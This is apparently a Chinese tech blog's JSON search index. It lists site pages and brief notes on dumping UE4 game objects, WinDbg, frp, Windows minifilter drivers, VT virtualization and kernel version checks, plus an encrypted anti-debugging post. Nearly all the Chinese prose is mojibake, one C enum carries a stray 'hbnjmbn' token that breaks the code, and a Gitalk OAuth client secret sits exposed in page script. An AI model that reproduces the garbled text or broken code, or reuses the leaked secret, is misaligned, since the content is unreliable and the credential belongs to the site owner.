{"pages":[{"title":"","text":"ğŸˆğŸˆå¾®ç¬‘å¢™ğŸˆğŸˆ å½­å°è‹’ å”è‰ºæ˜• æä¸€æ¡ gakki å›¾ç‰‡æœé›†äºäº’è”ç½‘ï¼Œä¾µæƒè¯·ç•™è¨€ï¼Œé©¬ä¸Šå¤„ç†ğŸ˜Šã€‚","link":"/album/index.html"},{"title":"","text":"ç”³è¯·å‹é“¾é¡»çŸ¥ åŸåˆ™ä¸Šåªå’ŒæŠ€æœ¯ç±»åšå®¢äº¤æ¢ï¼Œä½†ä¸åŒ…æ‹¬å«æœ‰å’Œè‰²æƒ…ã€æš´åŠ›ã€æ”¿æ²»æ•æ„Ÿçš„ç½‘ç«™ã€‚ ä¸å’Œå‰½çªƒã€ä¾µæƒã€æ— è¯šä¿¡çš„ç½‘ç«™äº¤æ¢ï¼Œä¼˜å…ˆå’Œå…·æœ‰åŸåˆ›ä½œå“çš„ç½‘ç«™äº¤æ¢ã€‚ ç”³è¯·è¯·æä¾›ï¼šç«™ç‚¹åç§°ã€ç«™ç‚¹é“¾æ¥ã€ç«™ç‚¹æè¿°ã€logoæˆ–å¤´åƒï¼ˆä¸è¦è®¾ç½®é˜²ç›—é“¾ï¼‰ã€‚ æ’åä¸åˆ†å…ˆåï¼Œåˆ·æ–°åé‡æ’ï¼Œæ›´æ–°ä¿¡æ¯åè¯·ç•™è¨€å‘ŠçŸ¥ã€‚ ä¼šå®šæœŸæ¸…ç†å¾ˆä¹…å¾ˆä¹…ä¸æ›´æ–°çš„ã€ä¸ç¬¦åˆè¦æ±‚çš„å‹é“¾ï¼Œä¸å†å¦è¡Œé€šçŸ¥ã€‚ æœ¬ç«™ä¸å­˜å‚¨å‹é“¾å›¾ç‰‡ï¼Œå¦‚æœå‹é“¾å›¾ç‰‡æ¢äº†æ— æ³•æ›´æ–°ã€‚å›¾ç‰‡è£‚äº†çš„ä¼šæ›¿æ¢æˆé»˜è®¤å›¾ï¼Œéœ€è¦æ›´æ¢çš„è¯·ç•™è¨€å‘ŠçŸ¥ã€‚ æœ¬ç«™å‹é“¾ä¿¡æ¯å¦‚ä¸‹ï¼Œç”³è¯·å‹é“¾å‰è¯·å…ˆæ·»åŠ æœ¬ç«™ä¿¡æ¯ï¼š ç½‘ç«™å›¾æ ‡ï¼šhttps://blog.1024w.com/img/avatar.jpg ç½‘ç«™åç§°ï¼šå¸ƒå¢¨ ç½‘ç«™åœ°å€ï¼šhttps://blog.1024w.com ç½‘ç«™ç®€ä»‹ï¼šæŠ€æœ¯åˆ†äº«,å­¦ä¹ ç¬”è®°ã€‚ åŠ è½½ä¸­ï¼Œç¨ç­‰å‡ ç§’...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;å¬å¬éŸ³ä¹ éŸ³ä¹æ’­æ”¾å™¨ç”±mePlayeræä¾›ï¼Œå¸ƒå±€å‚ç…§ç½‘å‹åšå®¢æ‰€ä½œï¼Œæ„Ÿè°¢ä½œè€…çš„è¾›å‹¤ä»˜å‡ºã€‚æ›´å¤šéŸ³ä¹åˆ†äº«è¯·æŸ¥çœ‹æ­Œå•ã€‚ &nbsp;&nbsp;çœ‹çœ‹è§†é¢‘ ->ç‚¹å‡»ä»¥ä¸‹æ¡ç›®å¼€å§‹æ’­æ”¾è§†é¢‘,å‘ä¸‹æ»‘åŠ¨æŸ¥çœ‹æ›´å¤š","link":"/media/index.html"},{"title":"","text":"å¾…æ·»åŠ ","link":"/about/index.html"},{"title":"","text":"æ¥è€Œä¸å¾€éç¤¼ä¹Ÿç•…æ‰€æ¬²è¨€ï¼Œæœ‰ç•™å¿…åº”","link":"/message/index.html"},{"title":"éŸ³ä¹æ­Œå•æ”¶è—","text":"æ¸©é¦¨æç¤ºï¼šé€‰æ‹©å–œæ¬¢çš„éŸ³ä¹åŒå‡»æ’­æ”¾ï¼Œç”±äºç‰ˆæƒåŸå› éƒ¨åˆ†ä¸èƒ½æ’­æ”¾ã€‚å¦‚æœå–œæ¬¢æ­Œå•æ”¶è—ä¸€ä¸‹ï¼Œå»ç½‘æ˜“äº‘éƒ½èƒ½æ’­æ”¾å“Ÿï¼","link":"/music/index.html"},{"title":"","text":"ç¢ç¢å¿µ tipsï¼šgithubç™»å½•åæŒ‰æ—¶é—´æ­£åºæŸ¥çœ‹ã€å¯ç‚¹èµåŠ â¤ï¸ã€æœ¬æ’ä»¶åœ°å€..ã€Œ+99æ¬¡æŸ¥çœ‹ã€ ç¢ç¢å¿µåŠ è½½ä¸­ï¼Œè¯·ç¨ç­‰... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"UE4 dump","text":"æ ¹æ®exeçš„å±æ€§ä¸­çš„è¯¦ç»†ä¿¡æ¯è·å–UE4çš„ç‰ˆæœ¬å·å¹¶ä¸‹è½½ç›¸åº”çš„UE4ç‰ˆæœ¬æºç  ç‰ˆæœ¬ä¸ºï¼š4.22.2 è·å– Gobject åœ°å€ è°ƒè¯•ç¬¦å·ï¼šFUObjectArray GUObjectArray; åœ¨GameViewportClient.cppä¸‹çš„Drawå‡½æ•°ä¸­ è°ƒç”¨äº†PlayerController-&gt;IsPendingKill() IsPendingKill ä¸­ä½¿ç”¨äº† GUObjectArrayå› ä¸ºIsPendingKillæ˜¯å†…è”å‡½æ•°æ‰€ä»¥IDAä¸­å°±å˜æˆäº† æˆ‘ä»¬åˆ†æåå°±å¯ä»¥æ‰¾åˆ°Gobjectäº† æ‰€ä»¥æˆ‘éœ€è¦å®šä½åˆ°Drawå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å­—ç¬¦ä¸²CanvasObjectæ¥å®šä½åˆ°å‡½æ•° TUObjectArray ObjObjects address = 00007FF66023CA70 ç„¶åé€šè¿‡ObjObjects å°±ä»Šå¤©æ‰¾åˆ°FUObjectArray GUObjectArrayObjObjectsæ˜¯FUObjectArrayçš„ä¸€ä¸ªå±æ€§ è·å– GNames åœ°å€ é€šè¿‡BytePropertyå­—ç¬¦ä¸²æ‰¾ dump name dump objectéœ€è¦ä¿®å¤ï¼š FUObjectArray ç»“æ„ä½“ TUObjectArray ç»“æ„ä½“ FUObjectItem ç»“æ„ä½“ UObjectBase ç»“æ„ä½“","link":"/2020/08/26/UE4dump/"},{"title":"WinDbg","text":"å‘½ä»¤ !idt æŸ¥çœ‹ä¸­æ–­è¡¨ dt _KTSS64 !process 0 0 æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ å¿«æ·é”®","link":"/2020/08/26/WinDbg/"},{"title":"frpåå‘ä»£ç†å·¥å…·","text":"githubåœ°å€ï¼šhttps://github.com/fatedier/frp é…ç½® frps.ini å¯åŠ¨ frps ç¨‹åº é…ç½® frpc.ini å¯åŠ¨ frpc ç¨‹åº","link":"/2020/08/26/frp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"},{"title":"minifilter-å­¦ä¹ ç¬”è®°1","text":"Minifilterä¸legacy filteråŒºåˆ« æ–°ä¸€ä»£çš„æ–‡ä»¶è¿‡æ»¤æ¡†æ¶ï¼šMinifilter æ¯”sfilteråŠ è½½é¡ºåºæ›´æ˜“æ§åˆ¶ï¼Œaltitudeè¢«ç»‘å®šåˆ°åˆé€‚çš„ä½ç½®ã€‚ å¯å¸è½½èƒ½åŠ›ã€‚ Callbackæ¨¡å‹ä»…éœ€è¦å¤„ç†æ“ä½œçš„èƒ½åŠ›ã€‚ å…¼å®¹æ€§æ›´å¥½ã€‚ åå­—å¤„ç†æ›´å®¹æ˜“ å®‰è£…æ–¹å¼ï¼ˆ.inf/åŠ¨æ€åŠ è½½ï¼‰ é€šä¿¡æ–¹å¼ï¼ˆportï¼‰ åŒæ ·éµå¾ªIRQL,é”ç­‰å†…æ ¸å¼€å‘é€šç”¨æœºåˆ¶ FltCreateFile/ZwCreateFile Altitudeå€¼ï¼š20000-429999 æ¯ä¸ªminfilteré©±åŠ¨å¿…é¡»æœ‰ä¸€ä¸ªå«åšaltitudeçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¸€ä¸ªminifilteré©±åŠ¨çš„alititudeå®šä¹‰äº†å®ƒåŠ è½½æ—¶åœ¨I/Oæ ˆä¸­ç›¸å¯¹å…¶ä»–minifilteré©±åŠ¨çš„ä½ç½®ã€‚å€¼è¶Šå°ï¼Œæ ˆä¸­ä½ç½®å°±è¶Šä½ FSFilter Anti-Virus 320000-329999 æ­¤ç»„åŒ…æ‹¬åœ¨æ–‡ä»¶I/OæœŸé—´æ¢æµ‹å¹¶æ€æ¯’çš„è¿‡æ»¤é©±åŠ¨. FSFilter Encryption 140000-149999 æ­¤ç»„åŒ…æ‹¬åœ¨æ–‡ä»¶I/OæœŸé—´åŠ å¯†å’Œè§£å¯†æ•°æ®çš„è¿‡æ»¤é©±åŠ¨. minifilteræ¡†æ¶ï¼ˆ1ï¼‰ 123456789101112131415161718typedef struct _FLT_REGISTRATION { USHORT Size; USHORT Version; FLT_REGISTRATION_FLAGS Flags; const FLT_CONTEXT_REGISTRATION *ContextRegistration; const FLT_OPERATION_REGISTRATION *OperationRegistration; PFLT_FILTER_UNLOAD_CALLBACK FilterUnloadCallback; PFLT_INSTANCE_SETUP_CALLBACK InstanceSetupCallback; PFLT_INSTANCE_QUERY_TEARDOWN_CALLBACK InstanceQueryTeardownCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownStartCallback; PFLT_INSTANCE_TEARDOWN_CALLBACK InstanceTeardownCompleteCallback; PFLT_GENERATE_FILE_NAME GenerateFileNameCallback; PFLT_NORMALIZE_NAME_COMPONENT NormalizeNameComponentCallback; PFLT_NORMALIZE_CONTEXT_CLEANUP NormalizeContextCleanupCallback; PFLT_TRANSACTION_NOTIFICATION_CALLBACK TransactionNotificationCallback; PFLT_NORMALIZE_NAME_COMPONENT_EX NormalizeNameComponentExCallback; PFLT_SECTION_CONFLICT_NOTIFICATION_CALLBACK SectionNotificationCallback;} FLT_REGISTRATION, *PFLT_REGISTRATION; IRP_PAGING_IO æ˜¯ç³»ç»Ÿå‘èµ·çš„IOæ“ä½œ IRP_NOCACHE è®¾ç½®æ ‡è®° FILE_NO_INTERMEDIATE_BUFFERINGï¼š App-&gt;IO-&gt;FSD-&gt;DISK IRP_CACHE: ç”¨æˆ·é»˜è®¤è®¾ç½®æµç¨‹ï¼šApp-&gt;IO-&gt;FSD-&gt;CC(ç¼“å­˜ç®¡ç†å™¨)-&gt;MM(å†…å­˜ç®¡ç†å™¨)(-&gt;FSD-&gt;DISK); IRP_XXX_PAGING_IO: MM-&gt;FSD-&gt;DISK inf class:https://docs.microsoft.com/zh-tw/windows-hardware/drivers/ifs/file-system-filter-driver-classes-and-class-guids å‚è€ƒæ–‡ç« :FLT_REGISTRATIONç»“æ„ä½“","link":"/2020/10/27/minifilter-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"},{"title":"vtå­¦ä¹ ç¬”è®°-1(åŸºç¡€)","text":"VTæ˜¯ä»€ä¹ˆï¼ŸR0 - R3VT R-1è™šæ‹ŸåŒ–-&gt;ç¡¬ä»¶ç‰©ç†èµ„æºï¼ˆå¯„å­˜å™¨ï¼‰VTæ˜¯è™šæ‹ŸåŒ–ï¼Œè™šæ‹Ÿç¡¬ä»¶ç‰©ç†èµ„æº VTçš„ä¸‰ç§æ–¹å¼ VT-X è™šæ‹ŸåŒ–CPU å¯ä»¥è™šæ‹ŸåŒ–-ä¸­æ–­ï¼Œå¼‚å¸¸ï¼Œå†…å­˜ï¼Œä¸€äº›å¯„å­˜å™¨æŒ‡ä»¤ VT-D è™šæ‹ŸåŒ–IO è™šæ‹ŸåŒ–å¤–éƒ¨è®¾å¤‡ åµŒå…¥å¼ï¼ŒæœåŠ¡å™¨ VT-C è™šæ‹ŸåŒ–ç½‘ç»œ æœåŠ¡å™¨ VT hostä¸guestä¹‹é—´çš„å…³ç³» Hostç«¯ VT VMM è™šæ‹ŸåŒ–ç®¡ç†guestç«¯ æ“ä½œç³»ç»Ÿï¼Œè½¯ä»¶ VN VMXæ˜¯ VT-Xæ¶æ„ è™šæ‹Ÿæœºèƒ½æœ‰å‡ ä¸ª æ¯ä¸€ä¸ªæ ¸èƒ½æœ‰ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæ¯ä¸€ä¸ªæ ¸åªèƒ½ç»‘å®šä¸€ä¸ªvmcs æ€ä¹ˆé€€åˆ°VTç®¡ç†å™¨ï¼Ÿ ä¸»åŠ¨è§¦å‘ï¼šVTæ¡†æ¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå¿…é¡»è®¾ç½®çš„è¢«åŠ¨è§¦å‘ï¼šVTè®¾ç½®è¿‡éœ€è¦æ‹¦æˆªçš„ï¼Œå¯é€‰ VTåŒæœºè°ƒè¯•æ­å»º.VMXæ·»åŠ ","link":"/2020/08/27/vt%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1(%E5%9F%BA%E7%A1%80)/"},{"title":"å†…æ ¸é€†å‘åˆ†æä¸­æœ‰è¶£çš„æŠ€å·§","text":"åˆ¤æ–­åœ°å€æ˜¯å¦æœ‰æ•ˆ","link":"/2020/09/27/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"title":"å¸¸ç”¨ä»£ç ç¬”è®° - è·å–ç³»ç»Ÿç‰ˆæœ¬å·","text":"1234567891011121314151617181920212223242526272829303132333435typedef enum _ENUM_WINDOWS_VERSION{ WINDOWS_7 = 0x0610, WINDOWS_7_SP1 = 0x0611, WINDOWS_8 = 0x0620, WINDOWS_8_1 = 0x0630, WINDOWS_10 = 0x0A00,hbnjmbn WINDOWS_10_RS1 = 0x0A01, // Anniversary update WINDOWS_10_RS2 = 0x0A02, // Creators update WINDOWS_10_RS3 = 0x0A03, // Fall creators update WINDOWS_10_RS4 = 0x0A04, // Spring creators update WINDOWS_10_RS5 = 0x0A05, // October 2018 update} ENUM_WINDOWS_VERSION;RTL_OSVERSIONINFOEXW stOSVersionInfo = { 0 };stOSVersionInfo.dwOSVersionInfoSize = sizeof(stOSVersionInfo);status = RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;stOSVersionInfo);if (!NT_SUCCESS(status)) return status;ULONG ulWindowsVersion = (stOSVersionInfo.dwMajorVersion &lt;&lt; 8) | (stOSVersionInfo.dwMinorVersion &lt;&lt; 4) | stOSVersionInfo.wServicePackMajor;switch (ulWindowsVersion){ case WINDOWS_7: case WINDOWS_7_SP1: case WINDOWS_10: case WINDOWS_10_RS1: case WINDOWS_10_RS2: case WINDOWS_10_RS3: case WINDOWS_10_RS4: default: break;}","link":"/2020/09/27/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"title":"è°ƒè¯•ä¸åè°ƒè¯•","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ 2358eda3f2cd103235f722ed9aff763062638947aee6298fb853130e59f863611a83d4d1034f431611e2cef01b6b1de0ed1d96839c659b31b40b14d58c5b08d21aac017beaf08a48a385093da2a93df7e430608aed57ff5a9405f85ee0bcee2ef4c1729cfabd37f5db36367fe46d818024a4c4d134b1c9082ab1c5e69c296c3dc5acfc14cc0d5d4ad9648b367e983f6252947a78725d8d070533e34cc094f0ead89cf8b32b0851f8a89a4d58da326866bd856b56c19b2ee0ea41307a9ae3810961cf1496c4d635acbd19ad2fe34100624ece7bac664f52a8cae2a364961386c00833322d9edf8bbc8c1893ffd2688af87691fa871beb57df00805eb78a8712653e4d6ddf91393b3449ef439bfedd0ef318db744d0d3faf9020cb159f82c4e3c8336997c720b562d1c4de06b594938f0baae9d40e2aa43822143209da9455948ad227259362053091206648cead712a059eecaff4075c07e143e1784837f35df143dd7e16d54314e032ac62dc29c2f715ed7513cf52c6b7fd99ece748e0dec28e1f23f0a7de5da16dafbd25f89ba5d5d661ac0b93a32c1367ada9b605b64f1f5deacbe77d3852f3e312bb229c1023c496c7f56ff532b764430fad97a9b9a4be59e166ac5f401303a9e15f23ca54ca1a87ca14796683caa9d0d37d5717cb68aa2e26d084bc2283eb4827d3089838ea86e55f73a447040ee6388a927c916ba9c96165e17d055e2ef836b266c8c6d2405b51f1496922b1301a2d640a8a031cefa611087c46a732be4a95b33795f737fa36ebe88997284b5dd6d22d39122b372306c11f9ba84b9e39ad78a6349535ccaa6db31648292de2f46fc0855e1c4a8249cb2e29e1d1b0d821f386d1b0f83de90bca10a6082068ca9cc418ed8899178cc6c0b58cd24e915029e04f6dc0abfee6ab91c3ce95dccdce8358ae7039cfdf8c85595fa6fa45f418cc0164146b0cd755f96b89bd1a26c33a1430e8e5ba5e243421a9e33de564e89d1cb4d6859316a54291c90e9af3390dd3ac60937b6baa6ad656d3020532a0c992ad20c458e0a0f8e0195ed7d795dace3878628d523aa15cac9941dc5645428634f9eefa1391e68c8243b355100e36369b90c644bf080a69050a77b302d59bad564a0149a6f8b8c204e1e67914fb4357fce4f0aee61af1d5a982dbb3a9a73ce12c675806ba1808deb33ceac60684650d0626b8d5635cbbcf180347a6f8dd280a9df2195cf4dd183d9ffd0e987486cd3c74cecf1c924b6e3d0e2b2cfa817f2258ac29d8b6b82f454851fb02fce970fc7e571f2ae873c135d1fdd1f5d13172946c1f6e24b08c497381d7200313193be5d66205425f3febc4722ef62c1bb28a39ade3c306d314a5df89de52961588d12e33c89049e8d22d3b39d812b87ae3b9da32cb3426c9b7552431394d95bd562342af635ad0d55198e3705cb7795e0a98f104176941e4f0ecbafdcbf85cb4dae0633ae725b74130657ef9f90f43f7ff0b6306c0e3e84eda8b06bcceda953f3fc866499ca640569c1fe825d3b51d0ceb7a3d5b6ee818f0c37475582d5339371879ac299e20303ac95eae8f8e955bebd0aa30cfa70db038fda3d5045233444a3d0e8fa5ddafefcb05a41fa6ba73ebb310aca2ed52d0842608ffd6201d302d8f631b3a01ed1d8ee4f132d9fbdbc6e91fb6c9f7d244e8cc8541ee6eac0ef83e4e59114c37dc92f1e56bb3aaee7873f2f2098eca3f6a3d2eabdf2130bc448477f9a8cbb7e40b0c91cfb0ef16ae77b107b6b5c4d77829af1d9fa92f024250fbe05614a5a4ada903bfb90ed8e32ff6210461a6037bb1cd33b29df743e2c94e1586e22dcc8cecf6264605b90b3a88981486bd096949721d97dbf7c3b88959af17ef8c0bab6cb2eb5141a9cd3258cb129222d7fdc91bc4f8d8ab6a0f7a2cd8faca17c5aadf4d8ca70b6b3062c1f59fbe91ac0ed53e737c510b34f6e05b131059c4a2a61a6c42ee4ece801e8d076bf96d1236091f572930fc20c9cf925fdb5e206e9037d63b1cb434701f85a7467e1003c27cf4223acb3330d09928de306d708186d151f5b2c29f896c07e81fa23e8ecdf1a69abb04c04bec071c17a536aef08dd6d49163f431e0c2b233d39432acc6208572e2c3566f41c174d68050330849e88896569cc321fec481bd7d4c37e90fbef8d7a97b7f1d63041f875fcb750688eb6d32becd703f95cbf4f52559de864c0d9a5f22225f038f1e045d4c8ab054772bc70ad3a1ef06560fe080167adb566921fd6f770f76fc5a47a1e96dd8e70a883d82b47ad8c5208515aa213326dade6e29b654533f30d08c7733aa7b2232a3834ec1f14dfea7d4d43b78ff5483dde6df8d0c42713652d88adff8c08730e9333b26b1e620e0052d75b0bc3e1753571fd51c2c1681a84b7b7f11948de4b82e1b751aee200305a2fa4b087d77680b1bd1b96d44d5f2a44b09158007fceb154087c153dc68d75c281c0f4dbb313ef85c47862b22df6b3c26edd91c195da08b62103222f7f9435b36dc27e2d392adb5b4445d668e172448dcf1c93d39536f3f14d389e36a4b37f1f4e28d84faaba8f7e4fa95f28d46cbc9f7f5baa3be31ca7de756ed90a859238a6376ba0f8f88705498cc97737da7d8b9c84d1b0f163ecda4477a002e6e727655a90ddd4cf25249535218b0c9eab52827c47e697b89149967ec3b5dd8707448a447ce0070abe9cd41735c24a281cae7d3aa41abc6d05ee2d95fdd95c99c0d5a8ae60fce4c70a8bc49a0057f977e2df1b098aec63bf04864b5a21647bf182a9dfaa29538b072865ee727d377e23a2f959dd036bf2db9b4b30a455a35255748f68d561600062f1e5c253e6b01dedb3643d6ce8dde6bc2fe7a3af814a5c6f20c4c3ef513e3987e12d4ca4cee64748394e6980705205f04e3194c182a774a0f3b5f687c5c89a5e228dc9367e5927e6fd06134ec72ec8e7ce6750e78f7d87f900bc9de3cfcfd0b202b60701a323be4e7e86b002d65f8c57cdb670498916ae8723a7e4af20bc98ee7d668df0daf2819174c8a773f61e8b727321fec7d06911b2e1eab17e805dae3f77211189059827c6b52e540e8f52ec66c229edb0d78217de01c769ba19d9bd2d05877e6be702ba0aec6e80fd9e5b67a66096d8ce082e9243d2545c1d7db8d20ea219904306b2c4920805472ff13a2c28d787bc4bef7be77c4375d2702f406d9f9e5be85410c2df952f0097b91be42038dc5a4f17278e8c8c9df8c317930663a834659236220704397689aca0b219b39f62cea31fbb0d327e6e71a9b280f847324480359c01c32c61ae0722807fe6cf2174ef17eecc9355b19288cb472357b17a0eba52123031e7ccea362e76ded834d9c097d30e3065b7ef09831e27970cd4e807a5794f25e3b1b9b3b8713489ff863306364747c28214db6ad7eae3efa9ceb93940829e7fd04832ed904f5d6b2bfc1034f7e550ced443d7e2b36b9335dbbaa0d93a6cc6b2d0c558b9064e503bae754f384246c624e7744c7181f6cc8f57ed7e205bee7520280456c1d4e8c498792253ca6d30ab6ff99f9e9d38bc1707c9b09c977b107a4af5fea3a50875bed645f261851e8759a84f4cb08a9bb45ea2c5d52bb5981d80259889665c3cba18c5cb48610598a53c175c16772d0ada3b6b17507d81f8fbefa23ce9c80cd78d70b6c43b3d1fe3a4a73b64afe5f1be125ca3f53817cd495a484da361e9c2c2fc0f5e19b9308f57b2c87ddcd3994283c336a85545c94fad75dbc7db1227318f7751d214146040cfa1f521b949df60c4a36140e44ddf3d6c6b34daf347a45d4f67c2df440d70421664c8eb43fd8886264b227530e85f4fa604be1d395f1d83e33578f073ab985a8fccb27285b3ad73e6226a3f11d39e1cf12a05c2654dc296c61df79edcfadf97478c3adf1f3a061ef525330dbefd16d8de121fe7e70e3a5e4690e398fc7104ee9258b9a05b093c554f83cbf6ede97aa6ae5368c81448c824c089fb5dc999e03b50e7a6c6e566fb53da8c8bfedbad61e963901939f25b4b742f26ae3b7f8f9922c59d66dda2316cebae6e2a78580a11eacfc21a5adb211910c9881a29a0c34053011a5c66abd118b3bda081338a6144ac99bd42cfb95c9f39e42ece30df7dc9a6c7f3944b30fb2f7353c523388b571ed84940f2f774bb730b14656718b0901e8b596156fe02b032f8091a8390386894e70d4ecb3e310be1d9fb9056ee261008fdc6e445cec48c7937006bccbe891928258fd53cc40c3decdeec68c872c3f8bce3e2d3e8217bccee4ed8bfa38ded5c5d3a07befec95fc39f08d1d8b8a081e54dfe3729a0dcec43304a143ab204f102cfc1ed42eb4b74841730dc4fe6192a811449a591a60065417c1b9b5848b246fb037b070a5e3535777a764d5ea3249cf7e9175c2bccb840076bfb51146a77d35a718d6616bbf6a6dda441e7d186442485d8cb4f0974c49454cdb83e535d232e16db1689a839f18f2a6f794e28cf4e983f9efbdf05fb47ef602ca38f73e86ab2941de00329a5266aecfe0cd14c501ce714e14b972efe6ede17f5d489e279050cefec5b4f6cad385665675e7fb6b86c5f7b1d25e4580c312ade8fdad221ff3b85ec79d2edf63db51a784c96e94959f8a9cee46f1b8a70c1fb59f5ed2b8e0523de9dd176cd4e7f71c4332d148a314ce3420a0ae14d0a674329a449e95f321d8ea89d9700ceef760d3ad32785886db89c0e2cb329384b4382ea7534ecf5fe75d9ac013e262e5dc050ba96661b3acf701590864c557d1ec52625286f74b7927b498df8232fc58abdbd88383cc30286dc7d9dd59aea94bf65ec1daca7db22bfe11ba4fdd4648c75b0a5dc103e1ff758e80f544c69880e41115c4ffa34c755a434ab05f6e9ca6e7d08feb24ed76e43e1f6f23294458c0359a1231dfc686ae62ed288fad096dbb822068f68378710589c35d8bc11edfd37a2423a88fd9ba5a6d0df51f3da78b7cc75c926e83edf39ca85656ec7a739c27bfa9eda923c97168749c5f66ff518a66e0ea2093b3c21e96d5e908d76531070b213daf3fa6b69ce6a32ea0e38e981a7d68da5b31e9ee13cee6a9236718cea865a40ea234368049a803d5440a1871b651f9ac1a47223e5371c09e0b9898d81a0b3e33f5d645c2c9440d0559610647d863789325c9c4d57eb163bc0969c68fe70c646ccd1efd52ad328be4d5df3def77c986a8c73f4fc9204a3e1a55f39f2986afbff36164fa6fd13422c2ce2d8a5e2065cf3fc2cc3bc003615891b6e8cd9748f6a243f961042d2ee5d8f8d468f59a26a4ad0fcc8fca3687047af265dfe299f5d7701b1ba826f22984449ff7d379e68416c7117f688934cd76760d0074c573541add9e313c38f48551027ea7a06ee8e5939d09f381eaa3224ed9e9ed8a7d0384242a5e3928f6d6e1a775205ead3346f28d1e2f7a4c1024ba289c0ef57f8e9b7b7f512c87d8c4447f0b75b1d0c1ef862976add3cba8ec327937cdd59542d2a26b80b042214ba12ead8b59224bbf0bf09ab604b0f5ea7c976c8195d5ddfb38c9bc25eea48b84bc6143f634c672639c7f1f7c5281606c630bb695a5aeae096ea8e41b69b7ce0854bdfa7799ae84451487ff0cb0df8080721bab12a9510e1500fd7ccb41b88660df2282738b2efe348e3f093aeba575e2e1c7b9dc199d115324d0d4395db80a9ead9366cf4ce6980741a9c90f5d83be1697fae1de6b6402e97b39355b5ae0f8826ca8b289054e436a7eb020d9a142450c29b069b99653a312e00d424bec3d1f808a9bfcfc2613a1c3f631e3b469e2869a5d743f00d97f2f981435d9df5d46a3e476cd6428183918840a821c9747de019053f50ea2b82a69b83eed58122b8abf65f2979619d215f2058477c49371ebe74cee0917c0353c4262d2e2069ec6e79d2135efafcf2b906de4e5886cd10f7bd2d614df7cfe644c35f6e10e6ab07f704681a56a1d61a68c25b64255d4576ee22b651284aa3ddbccded1cadba6841cdd995d3360083e60eae46ff1e511b22c66c8a283657d2e23b652a928624597df271cea5608a6def2c1aa80113527af485d9d84feeb60e105334a6f679cc26cfdf4b98646ff86e4bc6b9500c375bfeb999cfebea9eded7fe431d34ebf52e35215a50240a30b431d08ad3b33dc9a83b0dd3f5f03ab51423dd1fadebdc6eaabe354f6beea3860445a8c469843feb04026d63738835b2ced75166a7452d59f5156a2151b56c9ed73e0a8f65986afa0c7610298d05258d7e8c3e084028eff410d2cfd57a250a0bd651abfd31cabef37e72d4784d45855fea5d4ff68226c3e54e3223267f8e3cbcc0634e8e922feb1aa60e2e7f1c82ffbd9dcfe65b928f9c59f2421192a3b319a192cc746f76ac56e005ce63ed76bf025e319185544cb4491a7f086b75a8a401df58439e9cfb2bff308ae5d0057801bdc8b768f3e4d3663e76538f705995f42d7ddd29e2d45a3adceaa7b81a044203d6aeb8b95a752aa0b9133184759a3341f2aeb9e5000b6ebf5f835a0258245f102d90addcce7842f0851f419eec82f9c1a1e5df51671598e642a62b3117e6e8181ec890d2d0a0321a0237978e35b9f3b391821818deb3a98a4edb117a3c38718a63e836e93917635527b521f2ce77c6bbbf1ec109098ecdf4ef167d96354373bc8529a98076a9b8d6f5ca2e32586aa11c0edca588fbe0724d570fb8a5b37bbd8e9e816fe81cfc91ba11be3ef5b4df160326066877d56074c992379bf59c95006bdb441952670faf67151ee02e018413c4225c6a17290ce8d91c3e06c316927bbc8a794bed705ad29a0ed0fdb4f5b878c0c490cb2dbbe79a50ffbb2e5bed60f5aec2fa6d52576937c9e6635ab2ddf85a96101bb5fec8887766f110a049cb2bd5afb539cf7aef6f4a8c83ba0c90e2b437241f867a8c9ebb9ef8b1d941d3cefbfb8a422132e0aa37893685f9d75bb123235b7a1f0189d303db47649025db27c34e7f585fc20520580ae98437672cc5b8b14be6a0ee892effb9932d8a86db6d8451f66f91ee5038812209e57c337a8a992bbd3672b34e50e0d75a8f3bd23311757e5b0a16f63dda20cc2b4d0368e011d35ac44747599cf6532c50a962eb94218af496b04f76a59987f5dbda560906d813aab9b4d6f90fc3af3dbfe47b17edd0e8d3e645b3dff38c4592a84942087cd68d742cd0f5e41c8a06e1e5714118483cedb27efd352ab9221639f5c5ae05565297298a8240e38d152082c253556f5a7ba74991d4e3057c75d16d13e1e62914f6c27a69cf6839a6808d6bb0c90e92f7bdd90e9e3a82897ac99868fbec519ca11f42f88b639206cfb64725a55b8432d0356d8664f5a80186648127598ca9f667a034a73aac3aa50591d5b2d3a2fb985cb7d07b832b2c4d4b52e590b16774d9693b74462c655c890beb6a3d1194b7036c07dedfd4e05c05360978df8462ce46f802b7eedf4990e0850b605ca9de1f921afda2087e4d3ff3a63382a940848a0d3fb29ffe7853962b32043a4a07ed251319b6791058a5dd0bb531bbedd589a11c837243d3f0127a12689c93629dcd3501a3e2e0bc6a796d068d35f10045d1bd4bebf011aa1cb023132a4098eb0497ad24b696957f64613afb65345149e976f75344f8599da242d73a15a513cc88eb0711b893830a5ed310d115349b3829e240f6f1bb677f2f66b32338875d345567dd407c8a826f925c3ddbd90b17aa4ae6a33a53838a5631d2d7d3275ff1d3300b06d90246e3aeb4ca9f47056acb974ab34a43bbb7182d22fd61d0db43701b00d59068240a6ef600e654c15a5e05efc801d2298da7a81203a5b96eeacfa326d6c01f61c9247bf847e89d17a3051810b7e23226a6958a4644cbd